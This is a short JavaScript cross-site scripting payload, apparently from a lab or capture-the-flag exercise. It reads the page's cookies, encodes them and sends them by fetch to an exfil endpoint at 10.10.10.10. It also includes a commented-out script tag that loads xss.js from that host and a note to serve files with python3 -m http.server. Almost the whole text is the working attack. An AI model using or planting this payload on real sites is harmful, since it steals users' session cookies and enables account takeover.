// Retrieve the current document's cookies
let cookie = document.cookie;

// Encode the cookie data to make it URL-safe
let encodedCookie = encodeURIComponent(cookie);

// Make a fetch request to a specific URL with the encoded cookie data
fetch("http://10.10.10.10/exfil?data=" + encodedCookie);

{/* <script src="http://10.10.10.10/xss.js">
</script> */}
// python3 -m http.server 80
